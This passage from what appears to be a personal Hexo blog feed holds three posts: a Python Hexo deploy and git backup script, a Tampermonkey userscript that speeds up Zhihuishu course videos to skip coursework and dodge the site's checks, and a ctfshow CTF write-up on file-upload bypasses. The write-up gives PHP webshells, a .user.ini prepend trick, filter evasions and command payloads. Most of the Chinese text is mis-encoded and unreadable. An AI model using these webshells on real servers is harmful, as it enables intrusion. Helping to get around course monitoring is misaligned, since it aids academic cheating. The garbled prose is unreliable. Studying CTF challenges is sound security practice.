class="line">        new_categories = <span class="built_in">input</span>(<span class="string">&#x27;ä½ æƒ³è¦ä¿®æ”¹tagså—ï¼Ÿ(y/n) é»˜è®¤n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> new_categories.lower() == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            categories_str = <span class="built_in">input</span>(<span class="string">&#x27;è¾“å…¥ä½ çš„categoriesï¼Œæ³¨æ„ç”¨è‹±æ–‡é€—å·åˆ†éš”: &#x27;</span>)</span><br><span class="line">            categories = [category.strip() <span class="keyword">for</span> category <span class="keyword">in</span> categories_str.split(<span class="string">&#x27;,&#x27;</span>)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            categories = [<span class="string">&#x27;CTF&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        new_contents = <span class="string">&#x27;---\n&#x27;</span> \</span><br><span class="line">                       <span class="string">&#x27;title: &#x27;</span> + file_name + <span class="string">&#x27;\n&#x27;</span> \</span><br><span class="line">                                               <span class="string">&#x27;date: &#x27;</span> + time_str + <span class="string">&#x27;\n&#x27;</span> \</span><br><span class="line">                                                                     <span class="string">&#x27;tags:\n&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> tag <span class="keyword">in</span> tags:</span><br><span class="line">            new_contents += <span class="string">&#x27;  - &#x27;</span> + tag + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        new_contents += <span class="string">&#x27;categories:\n&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> category <span class="keyword">in</span> categories:</span><br><span class="line">            new_contents += <span class="string">&#x27;  - &#x27;</span> + category + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        new_contents += <span class="string">&#x27;---\n&#x27;</span> \</span><br><span class="line">                        + contents</span><br><span class="line"></span><br><span class="line">        f.seek(<span class="number">0</span>)</span><br><span class="line">        f.write(new_contents)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåŠŸèƒ½å®Œæˆäº†ï¼Œä¸‹é¢å°±æ˜¯ä¸€é”®ä¸Šä¼ å’Œæ›´æ–°åˆ°ç§æœ‰ä»“åº“äº†ã€‚<br>å…¶å®è¿™é‡Œæ˜¯å¯ä»¥ä½¿ç”¨hexoè‡ªå¸¦çš„åº“ï¼ˆhexo-uploaderï¼‰ä½†æ˜¯ä¸ºäº†ç®€åŒ–ã€ç®€å•ä»£ç ï¼Œè¿™é‡Œå°±è°ƒç”¨powershellæ¥å®ç°hexoçš„ç”Ÿæˆçš„å‘å¸ƒã€‚å¹¶ä¸”è¿œç¨‹gitç»™ç§æœ‰ä»“åº“ã€‚<br>å…¶å®hexoè‡ªå¸¦å¤‡ä»½åŠŸèƒ½ï¼Œä½†æ˜¯ä¼¼ä¹ä¼šå’Œæ–‡ä»¶å­˜åˆ°ä¸€èµ·ã€‚å› æ­¤æˆ‘è¿˜æ˜¯é€‰æ‹©äº†å•ç‹¬åˆ›ä¸€ä¸ªä»“åº“ä¿å­˜çš„æ–¹æ³•ã€‚<br>è°ƒç”¨cmdæ¥è·‘å‘½ä»¤ï¼Œå› ä¸ºä¹‹å‰gitçš„ä¿¡æ¯å’Œhexoçš„é…ç½®å·²ç»é…ç½®è¿‡äº†ï¼Œå› æ­¤ç›´æ¥ä½¿ç”¨å°±è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hexo_generate_and_deploy</span>():</span><br><span class="line">    <span class="comment"># cmdå‘½ä»¤ cdåä¿®æ”¹ä¸ºä½ è‡ªå·±çš„blogæ–‡ä»¶å¤¹ä½ç½®</span></span><br><span class="line">    <span class="comment"># å­—ç¬¦ä¸²å‰é¢åŠ ré˜²æ­¢è§£æï¼Œæˆ–è€…å°†å•æ–œæ è½¬æ¢ä¸ºåŒæ–œæ </span></span><br><span class="line">    cmd = <span class="string">r&#x27;cd C:\Users\natro92\Desktop\blog &amp;&amp; hexo g &amp;&amp; hexo d&#x27;</span></span><br><span class="line">    p = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE)</span><br><span class="line">    <span class="built_in">print</span>(p.stdout.read().decode())</span><br><span class="line">    a = <span class="built_in">input</span>(<span class="string">&#x27;æŒ‰ä»»æ„é”®ç»§ç»­&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">git_backup</span>():</span><br><span class="line">    <span class="comment"># å®ç°å¤‡ä»½gitåŠŸèƒ½</span></span><br><span class="line">    <span class="comment"># åˆ‡æ¢åˆ°æœ¬åœ°çš„gitä»“åº“ç›®å½•</span></span><br><span class="line">    repo_dir = <span class="string">r&#x27;C:\Users\natro92\Desktop\blog&#x27;</span></span><br><span class="line">    <span class="comment"># python3.6ç‰¹æ€§ï¼Œæ ¼å¼åŒ–æ–‡æœ¬</span></span><br><span class="line">    cmd_cd = <span class="string">f&#x27;cd <span class="subst">&#123;repo_dir&#125;</span> &amp;&amp; &#x27;</span></span><br><span class="line">    cmd_add = <span class="string">&#x27;git add .&#x27;</span></span><br><span class="line">    commit_msg = <span class="string">&#x27;%date:~0,4%%date:~5,2%%date:~8,2%&#x27;</span></span><br><span class="line">    cmd_commit = <span class="string">f&#x27;git commit -m &quot;<span class="subst">&#123;commit_msg&#125;</span>&quot;&#x27;</span></span><br><span class="line">    cmd_push = <span class="string">&#x27;git push&#x27;</span></span><br><span class="line">    cmd = cmd_cd + cmd_add + <span class="string">&#x27; &amp;&amp; &#x27;</span> + cmd_commit + <span class="string">&#x27; &amp;&amp; &#x27;</span> + cmd_push</span><br><span class="line">    result = subprocess.run(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE)</span><br><span class="line">    <span class="built_in">print</span>(result.stdout.decode())</span><br></pre></td></tr></table></figure><p>å°±æ˜¯ç®€å•çš„é€ è½®å­ï¼Œä½†æ˜¯èƒ½å¤Ÿè®©è‡ªå·±é€ è½®å­çš„æ•ˆç‡æ›´é«˜ã€‚<br>é™„ä¸Šå®Œæ•´ç‰ˆé“¾æ¥ï¼š<a href="https://github.com/natro92/YuQueShareLink">https://github.com/natro92/YuQueShareLink</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è„šæœ¬ </tag>
            
            <tag> Shortcut </tag>
            
            <tag> è¯­é›€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»é›¶å¼€å§‹çš„æ™ºæ…§æ ‘å€é€Ÿæ²¹çŒ´è„šæœ¬ï¼ˆä¸€ï¼‰</title>
      <link href="/2023/07/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E6%99%BA%E6%85%A7%E6%A0%91%E5%80%8D%E9%80%9F%E6%B2%B9%E7%8C%B4%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2023/07/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E6%99%BA%E6%85%A7%E6%A0%91%E5%80%8D%E9%80%9F%E6%B2%B9%E7%8C%B4%E8%84%9A%E6%9C%AC%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å‰è¨€ï¼šBYDæ™ºæ…§æ ‘å˜å˜åˆ·è§†é¢‘ï¼Œ1.5å€é€Ÿå¤ªæµªè´¹æ—¶é—´äº†ï¼Œé€šè¿‡æŸ¥çœ‹å‰ç«¯ä»£ç å‘ç°äº†ä¸€ç§é€ƒè¯¾æ–¹æ³•ã€‚å¯ä»¥é€šè¿‡ä¿®æ”¹æ’­æ”¾å™¨çš„å€é€Ÿæ’­æ”¾åŠŸèƒ½æ¥å®ç°åŠ é€Ÿæ’­æ”¾æ•ˆæœã€‚</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         æ™ºæ…§æ ‘16å€é€Ÿè‡ªåŠ¨è„šæœ¬</span></span><br><span class="line"><span class="comment">// @namespace    http://natro92.github.io</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  è‡ªåŠ¨ä¿®æ”¹è„šæœ¬å€é€Ÿx1.5-&gt;x16</span></span><br><span class="line"><span class="comment">// @author       natro92</span></span><br><span class="line"><span class="comment">// @match        *://*.zhihuishu.com/*</span></span><br><span class="line"><span class="comment">// @icon         https://www.google.com/s2/favicons?sz=64&amp;domain=zhihuishu.com</span></span><br><span class="line"><span class="comment">// @grant        GM_log</span></span><br><span class="line"><span class="comment">// @require      https://code.jquery.com/jquery-2.1.4.min.js</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">changeSpeed</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title function_">GM_log</span>(<span class="string">&quot;change speeed begins!&quot;</span>);</span><br><span class="line">  <span class="comment">//0 - 1.0 | 1 - 1.25 | 2 - 1.5</span></span><br><span class="line">  <span class="keyword">var</span> speed2 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab15&quot;</span>);</span><br><span class="line">  speed2.<span class="title function_">setAttribute</span>(<span class="string">&quot;rate&quot;</span>,<span class="string">&quot;16.0&quot;</span>);</span><br><span class="line">  speed2.<span class="property">innerHTML</span> = <span class="string">&quot;X 16.0&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> speed1 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab10&quot;</span>);</span><br><span class="line">  speed1.<span class="title function_">setAttribute</span>(<span class="string">&quot;rate&quot;</span>,<span class="string">&quot;8.0&quot;</span>);</span><br><span class="line">  speed1.<span class="property">innerHTML</span> = <span class="string">&quot;X 8.0&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> speed0 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab05&quot;</span>);</span><br><span class="line">  speed0.<span class="title function_">setAttribute</span>(<span class="string">&quot;rate&quot;</span>,<span class="string">&quot;4.0&quot;</span>);</span><br><span class="line">  speed0.<span class="property">innerHTML</span> = <span class="string">&quot;X 4.0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="comment">//ä¿®æ”¹æ’­æ”¾å™¨çš„å€é€Ÿå€¼</span></span><br><span class="line">  <span class="title function_">GM_log</span>(<span class="string">&quot;Hello Worldï¼&quot;</span>);</span><br><span class="line">  <span class="comment">// ä¿®æ”¹valueå±æ€§</span></span><br><span class="line">  <span class="comment">// var speed = document.getElementsByClassName(&#x27;speedTab15&#x27;)[0];</span></span><br><span class="line">  <span class="comment">// console.log(speed.innerHTML);</span></span><br><span class="line">  <span class="comment">// speed.setAttribute(&#x27;rate&#x27;,&#x27;16.0&#x27;);</span></span><br><span class="line">  <span class="comment">// speed.innerHTML = &quot;X 16.0&quot;;</span></span><br><span class="line">  <span class="comment">// setTimeout(function()&#123;</span></span><br><span class="line">  <span class="comment">//     changeSpeed();</span></span><br><span class="line">  <span class="comment">// &#125;, 5000);</span></span><br><span class="line">  <span class="comment">// bydå‚»é€¼æ™ºæ…§æ ‘ä¸€ç§’æ¸²æŸ“å®Œæˆä¸äº†ï¼Œå»¶è¿Ÿäº”ç§’åŠ è½½ã€</span></span><br><span class="line">  <span class="comment">// ç­‰å¾…é¡µé¢æ¸²æŸ“æˆåŠŸä¹‹åä¿®æ”¹</span></span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">changeSpeed</span>();</span><br><span class="line">    <span class="comment">//æ¨¡æ‹Ÿç‚¹å‡»ï¼Œè‡ªåŠ¨ä¿®æ”¹å€é€Ÿ</span></span><br><span class="line">    <span class="comment">//è¿™ä¸ªä¸è¡Œï¼Œä¼šæ£€æµ‹åˆ°è„šæœ¬é—®é¢˜</span></span><br><span class="line">    <span class="comment">// var e = document.createEvent(&quot;MouseEvents&quot;);</span></span><br><span class="line">    <span class="comment">// e.initEvent(&quot;click&quot;, true, true);</span></span><br><span class="line">    <span class="comment">// document.querySelector(&quot;#vjs_container &gt; div.controlsBar &gt; div.speedBox &gt; div &gt; div.speedTab.speedTab05&quot;).dispatchEvent(e);</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="title function_">GM_log</span>(<span class="string">&quot;Finished yetï¼&quot;</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·åªåšåˆ°äº†ä¿®æ”¹é»˜è®¤é¡µé¢çš„å€é€Ÿæ ï¼Œä½†æ˜¯æƒ³è¦ä¿®æ”¹å…¶ä»–çš„é¡µé¢çš„å´åšä¸åˆ°ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œæ™ºæ…§æ ‘æœ‰è„šæœ¬æ£€æµ‹ï¼Œå› æ­¤æ¨¡æ‹Ÿç‚¹å‡»æ— æ³•ä½¿ç”¨äº†ã€‚<br>ç»è¿‡æŠ“åŒ…å‘ç°ï¼Œä¿®æ”¹å€é€Ÿå†™åœ¨äº†å‰ç«¯ä¸­ï¼Œæš‚åœæ—¶ä¼šæœ‰æ—¶é•¿ä¿å­˜ï¼Œå¯ä»¥å°è¯•å…¶ä»–æ–¹å¼æ¥è¾¾åˆ°ä¿®æ”¹ã€‚<br>åŸºç¡€åŠŸèƒ½å·²ç»å®ç°äº†ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯æ’­æ”¾æ£€æµ‹ã€‚<br>å½“æš‚åœçŠ¶æ€ä¸‹idï¼ˆè·¯å¾„ï¼š<code>document.querySelector(&quot;#playButton&quot;)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684912224706-9e4ffb01-c67b-4d25-aff7-479a2237a766.png" alt="image.png"><br>æ’­æ”¾æ—¶ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684912271465-fafa5847-3a00-4b59-b21f-53901e2b6346.png" alt="image.png"><br>æ£€æµ‹æ’­æ”¾å†™å®Œäº†ï¼Œä¸‹é¢å°±æ˜¯å‹¾å§å¼¹çª—çš„é—®é¢˜äº†ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684913986235-680c6439-096a-4bda-abe9-f340b71de737.png" alt="image.png"><br>ä½ç½®ï¼š<code>document.querySelector(&quot;#playTopic-dialog &gt; div&quot;)</code><br>æˆ‘ä»¬è¦ç‚¹å‡»å…¶ä¸­çš„é€‰æ‹©æŒ‰é’®ï¼Œå†æäº¤ã€‚æ‰è¡Œ<br>æƒ³æ³•æœ‰ä¸¤ä¸ª<br>ç¬¬ä¸€ä¸ªæ˜¯é€‰æ‹©é”™è¯¯ä¹‹åé€‰æ‹©ä¸€ä¸ªä¸€ä¸ªå°è¯•ç›´åˆ°å¼¹æ¡†æ¶ˆå¤±ï¼Œç¬¬äºŒä¸ªæ˜¯é€‰æ‹©é”™è¯¯ä¹‹åæ£€æµ‹æ­£ç¡®ç­”æ¡ˆï¼Œæäº¤æ­£ç¡®ç­”æ¡ˆã€‚<br>è¿”å›æ­£å¸¸é¡µé¢æ—¶å‘ç°ï¼Œå¼¹æ¡†ä¸æ˜¯éšè—çš„ï¼Œè€Œæ˜¯æœ‰é¢˜ç›®æ–°åˆ›å»ºä¸€ä¸ªã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684916243149-df686aec-b7f0-444d-8f8f-628c6b8e22f2.png" alt="image.png"><br>æäº†ä¸‹åˆ«äººçš„è´¦å·ï¼Œç”¨äº†ä¸€ä¸‹å‘ç°ç­”æ¡ˆåœ¨æ²¡ç­”çš„æ—¶å€™ä¸ä¼šåˆ†å‘ï¼Œhtmlå¤„æ˜¯æ³¨é‡Šã€‚<br>ç›´æ¥æäº¤æ­£ç¡®ç­”æ¡ˆï¼š<br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__body &gt; div &gt; div.el-scrollbar__wrap &gt; div &gt; div &gt; div.radio &gt; div &gt; p &gt; span&quot;)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1684916770084-1ff9abd9-728a-4952-bf9d-bbdd0c631d73.png" alt="image.png"><br>æœ‰ä¸ªé€‰ä¸­å’Œæœªé€‰ä¸­<br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__body &gt; div &gt; div.el-scrollbar__wrap &gt; div &gt; div &gt; div.radio &gt; ul &gt; li:nth-child(1) &gt; div:nth-child(1) &gt; svg &gt; use&quot;)</code><br>ä¸­çš„hrefå€¼ä»<code>#iconxuan</code>è½¬å˜ä¸º<code>#iconxuanzhong</code><br>å¹¶ä¸”ç‚¹å‡»å…³é—­æŒ‰é’®ç»§ç»­ã€‚<br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__footer &gt; span &gt; div&quot;)</code><br><code>document.querySelector(&quot;#playTopic-dialog &gt; div &gt; div.el-dialog__header &gt; button &gt; i&quot;)</code></p><p><code>#playTopic-dialog &gt; div &gt; div.el-dialog__footer &gt; span &gt; div</code><br>å‹¾å§å¼¹çª—æ¨å‡ºæ²¡è°ƒå¥½ï¼Œè¿˜å¾—è°ƒã€‚<br>å…ˆæç½®äº†ï¼Œç­‰è¿‡æ®µæ—¶é—´ï¼Œå‡ºæ–°çš„åˆ·è¯¾è§†é¢‘çš„æ—¶å€™æ¥ç€æã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è„šæœ¬ </tag>
            
            <tag> Tampermonkey </tag>
            
            <tag> Shortcut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web151-web170æ–‡ä»¶ä¸Šä¼ ç¯‡</title>
      <link href="/2023/07/09/web151-web170%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/"/>
      <url>/2023/07/09/web151-web170%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="web151ã€web152"><a href="#web151ã€web152" class="headerlink" title="web151ã€web152"></a>web151ã€web152</h1><h3 id="å‰ç«¯æ ¡éªŒ"><a href="#å‰ç«¯æ ¡éªŒ" class="headerlink" title="å‰ç«¯æ ¡éªŒ"></a>å‰ç«¯æ ¡éªŒ</h3><p>æ ¹æ®æç¤ºï¼Œæ£€éªŒå†™åœ¨äº†å‰ç«¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">layui.<span class="keyword">use</span>(<span class="string">&#x27;upload&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> upload = layui.upload;</span><br><span class="line">   </span><br><span class="line">  <span class="comment">//æ‰§è¡Œå®ä¾‹</span></span><br><span class="line">  <span class="keyword">var</span> uploadInst = upload.<span class="title function_ invoke__">render</span>(&#123;</span><br><span class="line">    <span class="attr">elem</span>: <span class="string">&#x27;#upload&#x27;</span> //ç»‘å®šå…ƒç´ </span><br><span class="line">    ,<span class="attr">url</span>: <span class="string">&#x27;/upload/&#x27;</span> //ä¸Šä¼ æ¥å£</span><br><span class="line">    ,<span class="attr">done</span>: function(res)&#123;</span><br><span class="line">    <span class="keyword">if</span>(res.code==<span class="number">0</span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;#result&quot;</span>).<span class="title function_ invoke__">html</span>(<span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œè·¯å¾„ï¼š&quot;</span>+res.msg);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $(<span class="string">&quot;#result&quot;</span>).<span class="title function_ invoke__">html</span>(<span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼Œå¤±è´¥åŸå› ï¼š&quot;</span>+res.msg);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">    ,error: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      $(<span class="string">&quot;#result&quot;</span>).<span class="title function_ invoke__">html</span>(<span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>æ£€æµ‹å†™åœ¨å‰ç«¯äº†ï¼Œå†™å…¥phpä¸€å¥è¯æœ¨é©¬ï¼Œä¿®æ”¹åç¼€ä¸ºpngã€‚ä¸Šä¼ å¹¶æŠ“åŒ…ã€‚ä¿®æ”¹æ–‡ä»¶åç¼€ä¸ºéœ€è¦çš„phpåç¼€ï¼Œå¹¶è®¿é—®æ‰€éœ€ç›®å½•ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688402955857-f686aac1-0654-4ed7-917d-cfca7ddd6fce.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688402971003-055c2997-e4ed-4ed8-9305-7289cd1bee30.png" alt="image.png"><br>payloadï¼šGETï¼š<code>?1=system(&#39;tac ../flag.php&#39;);</code></p><h1 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h1><blockquote><p><a href="https://www.dazhuanlan.com/vip_mmles/topics/1547397">https://www.dazhuanlan.com/vip_mmles/topics/1547397</a> userini</p></blockquote><h3 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h3><p>whatwebæŒ‡çº¹è¯†åˆ«ï¼Œå‘ç°æ˜¯nginxï¼Œè€Œä¸”åœ¨uploadé¡µé¢ä¸‹å‘ç°index.phpæ–‡ä»¶ã€‚è€Œä¸”å¾ˆå®¹æ˜“ä¸Šä¼ å¦‚php5,phtmlç­‰ç±»å‹æ–‡ä»¶ï¼Œä½†æ˜¯ä¸è§£æï¼Œéœ€è¦ä¸Šä¼ .user.iniï¼Œä½¿æ–‡ä»¶è§£æã€‚<br>.user.inié‡Œé¢å¯ä»¥å†™ï¼šè®©æ‰€æœ‰æ–‡ä»¶éƒ½åŒ…å«è¯¥æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = <span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688404601489-6ec09a2c-4a79-4083-b328-5d72e5cb6763.png" alt="image.png"><br>ç„¶åå†ä¸Šä¼ å›¾ç‰‡é©¬æˆ–è€…ç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬æ–‡æœ¬å³å¯ã€‚<br>ä¸Šä¼ 1.txtå†…å®¹ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> (<span class="variable">$_GET</span>[<span class="number">1</span>])(<span class="variable">$_GET</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®upload/index.phpå¹¶ä¼ å…¥payloadå³å¯ï¼š<br><code>upload/index.php?1=system&amp;2=tac ../fla*</code></p><h1 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h1><p>åŒ153ä¸Šä¼ .user.ini ç„¶åä¸Šä¼ å›¾ç‰‡é©¬ã€‚<br>åœ¨å‰é¢ä¸€é¢˜çš„åŸºç¡€ä¸Šå¢åŠ äº†å†…å®¹è¿‡æ»¤,è¿‡æ»¤äº†php , å¯ä»¥ç”¨å¤§å°å†™æ¥ç»•è¿‡ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688405318328-4eb99034-670a-4fe6-ac18-e23af1e2451d.png" alt="image.png"><br>payloadåŒä¸Šé¢˜ç›®å³å¯ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688405482171-89b0dee7-b7a0-4359-b477-396cfe446689.png" alt="image.png"></p><h1 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h1><h3 id="çŸ­æ ‡ç­¾"><a href="#çŸ­æ ‡ç­¾" class="headerlink" title="çŸ­æ ‡ç­¾"></a>çŸ­æ ‡ç­¾</h3><p>ä¸Šä¼ å½»åº•ç¦ç”¨äº†php å¤§å°å†™éƒ½ä¸è¡Œã€‚<br>è¿˜æ˜¯å…ˆä¸Šä¼ .user.ini ç„¶åä½¿ç”¨çŸ­æ ‡ç­¾ï¼Œå»ºè®®ä½¿ç”¨&lt;?=çŸ­æ ‡ç­¾å³å¯<br>çŸ­æ ‡ç­¾ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span> <span class="comment">//short_open_tags=on</span></span><br><span class="line"><span class="meta">&lt;?=</span>(è¡¨è¾¾å¼)<span class="meta">?&gt;</span>  ç­‰ä»·äº <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (è¡¨è¾¾å¼)<span class="meta">?&gt;</span> <span class="comment">//æ— é™åˆ¶</span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt; <span class="comment">//asp_tags=on php_version &lt; 7</span></span><br><span class="line">&lt;script language=â€phpâ€&gt;<span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>; &lt;/script&gt; <span class="comment">//php_vsesion &lt; 7</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.pngï¼š<code>&lt;?=system($_GET[1]);</code><br>payload:<code>upload/index.php?1=phpinfo&amp;2=tac ../f*</code></p><h1 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h1><p>ç»è¿‡æµ‹è¯•è¿‡æ»¤äº†[ ,å¯ä»¥ç”¨{}ä»£æ›¿[],å…¶å®ƒçš„æ­¥éª¤å’Œå‰é¢å‡ ä¸ªä¸€è‡´<br>1.png : <code>&lt;?=system($_GET&#123;1&#125;);</code></p><h1 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h1><p>åˆè¿‡æ»¤äº†;å’Œ{<br>1.png <code>&lt;?=(system(&#39;nl ../*.ph*&#39;))?&gt;</code><br>æ³¨æ„ä½¿ç”¨æ–¹å¼å¯ä»¥çœç•¥åˆ†å·ï¼Œ</p><h1 id="web158ã€web159"><a href="#web158ã€web159" class="headerlink" title="web158ã€web159"></a>web158ã€web159</h1><p>1.png <code>&lt;?=</code>tac ../f*<code>?&gt;</code></p><h1 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h1><h3 id="æ—¥å¿—åŒ…å«"><a href="#æ—¥å¿—åŒ…å«" class="headerlink" 